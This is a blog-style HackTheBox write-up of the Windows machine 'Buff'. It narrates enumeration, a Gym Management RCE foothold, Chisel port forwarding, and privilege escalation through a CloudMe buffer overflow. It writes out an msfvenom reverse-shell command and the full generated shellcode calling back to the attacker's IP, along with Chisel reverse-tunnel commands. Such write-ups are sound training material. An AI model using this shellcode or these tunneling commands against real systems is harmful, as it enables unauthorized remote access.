---
title: "buff"
date: 2024-09-03
draft: false
description: "HackTheBox buff writeup"
tags: ["hackthebox", "htb", "windows", "easy"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# buff

## Overview

- **OS:** Windows
- **IP:** 10.10.10.198
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

learnt how to portforward with chisel, update buffer exploit with own payload.

## Enumeration

**nmap scan result**

{{< figure src="image 1045.png" >}}

lets add 10.10.10.198 to our hosts

**dirsearch results**

{{< figure src="image 1046.png" >}}

{{< figure src="image 1047.png" >}}

{{< figure src="image 1048.png" >}}

homepage

{{< figure src="image 1049.png" >}}

contact page contents

{{< figure src="image 1050.png" >}}


- **Vulnerability**


gym management 

{{< figure src="image 1051.png" >}}

## Exploitation

alright so using the unauthenticated remote code execution exploit 

{{< figure src="image 1052.png" >}}

we have gotten ourselves a foothold

lets upgrade our shell by first getting nc.exe on our box 

{{< figure src="image 1053.png" >}}

using nc now 

{{< figure src="image 1054.png" >}}

now that we got our shell lets get our user flag

**User Flag**

{{< figure src="image 1055.png" >}}

runnign netsat -an gives us this 

{{< figure src="image 1056.png" >}}

we notice that there is something running on ports 8888 and 3306

{{< figure src="image 1057.png" >}}

we also find this executable file in shauns downloads folder.

runnign tasklist/v shows us that cloudme is running right now

{{< figure src="image 1058.png" >}}

for cloudme we find this exploit

[https://www.exploit-db.com/exploits/48389](https://www.exploit-db.com/exploits/48389) 

which runs only on a port that can only be locally accessed rn, port 8888.

lets use Chisel to portforward our targets port 8888 to our kali machines port 8888

lets go here https://github.com/jpillora/chisel/releases 

and grab this 

{{< figure src="image 1059.png" >}}

lets grab for windows as well

{{< figure src="image 1060.png" >}}

gunzip both of them and give them perms with chmod

{{< figure src="image 1061.png" >}}

now get the windows one on the box

{{< figure src="image 1062.png" >}}

now on our kali box we will run this

./chisel_1.6.0_linux_amd64 server -p 8000 --reverse

and on our buff bxo we run this

chisel.exe client 10.10.14.20:8000 R:8888:localhost:8888

{{< figure src="image 1063.png" >}}

nice we got our connection

netstat -anlp | grep 8888

this will tell us if it is connected

{{< figure src="image 1064.png" >}}


and yup we are 

ok now lets look at the exploits available for cloudme

{{< figure src="image 1065.png" >}}

lets use the first one which is the buffer overflow proof of concept

{{< figure src="image 1066.png" >}}

ok so apparently only the shellcode needs to be updated

lets generate one using msfvenom

msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload

```python
payload =  b""
payload += b"\xbd\x5c\x4f\xd7\xd9\xda\xda\xd9\x74\x24\xf4"
payload += b"\x58\x33\xc9\xb1\x52\x31\x68\x12\x03\x68\x12"
payload += b"\x83\x9c\x4b\x35\x2c\xe0\xbc\x3b\xcf\x18\x3d"
payload += b"\x5c\x59\xfd\x0c\x5c\x3d\x76\x3e\x6c\x35\xda"
payload += b"\xb3\x07\x1b\xce\x40\x65\xb4\xe1\xe1\xc0\xe2"
payload += b"\xcc\xf2\x79\xd6\x4f\x71\x80\x0b\xaf\x48\x4b"
payload += b"\x5e\xae\x8d\xb6\x93\xe2\x46\xbc\x06\x12\xe2"
payload += b"\x88\x9a\x99\xb8\x1d\x9b\x7e\x08\x1f\x8a\xd1"
payload += b"\x02\x46\x0c\xd0\xc7\xf2\x05\xca\x04\x3e\xdf"
payload += b"\x61\xfe\xb4\xde\xa3\xce\x35\x4c\x8a\xfe\xc7"
payload += b"\x8c\xcb\x39\x38\xfb\x25\x3a\xc5\xfc\xf2\x40"
payload += b"\x11\x88\xe0\xe3\xd2\x2a\xcc\x12\x36\xac\x87"
payload += b"\x19\xf3\xba\xcf\x3d\x02\x6e\x64\x39\x8f\x91"
payload += b"\xaa\xcb\xcb\xb5\x6e\x97\x88\xd4\x37\x7d\x7e"
payload += b"\xe8\x27\xde\xdf\x4c\x2c\xf3\x34\xfd\x6f\x9c"
payload += b"\xf9\xcc\x8f\x5c\x96\x47\xfc\x6e\x39\xfc\x6a"
payload += b"\xc3\xb2\xda\x6d\x24\xe9\x9b\xe1\xdb\x12\xdc"
payload += b"\x28\x18\x46\x8c\x42\x89\xe7\x47\x92\x36\x32"
payload += b"\xc7\xc2\x98\xed\xa8\xb2\x58\x5e\x41\xd8\x56"
payload += b"\x81\x71\xe3\xbc\xaa\x18\x1e\x57\xdf\xd6\x2e"
payload += b"\xb0\xb7\xe4\x2e\xbf\xfc\x60\xc8\xd5\x12\x25"
payload += b"\x43\x42\x8a\x6c\x1f\xf3\x53\xbb\x5a\x33\xdf"
payload += b"\x48\x9b\xfa\x28\x24\x8f\x6b\xd9\x73\xed\x3a"
payload += b"\xe6\xa9\x99\xa1\x75\x36\x59\xaf\x65\xe1\x0e"
payload += b"\xf8\x58\xf8\xda\x14\xc2\x52\xf8\xe4\x92\x9d"
payload += b"\xb8\x32\x67\x23\x41\xb6\xd3\x07\x51\x0e\xdb"
payload += b"\x03\x05\xde\x8a\xdd\xf3\x98\x64\xac\xad\x72"
payload += b"\xda\x66\x39\x02\x10\xb9\x3f\x0b\x7d\x4f\xdf"
payload += b"\xba\x28\x16\xe0\x73\xbd\x9e\x99\x69\x5d\x60"
payload += b"\x70\x2a\x6d\x2b\xd8\x1b\xe6\xf2\x89\x19\x6b"
payload += b"\x05\x64\x5d\x92\x86\x8c\x1e\x61\x96\xe5\x1b"
payload += b"\x2d\x10\x16\x56\x3e\xf5\x18\xc5\x3f\xdc"

```

this is the payload we r getting now lets update the script

{{< figure src="image 1067.png" >}}

{{< figure src="image 1068.png" >}}

aannnnd we have our admin shell on 443

{{< figure src="image 1069.png" >}}

Root flag

{{< figure src="image 1070.png" >}}
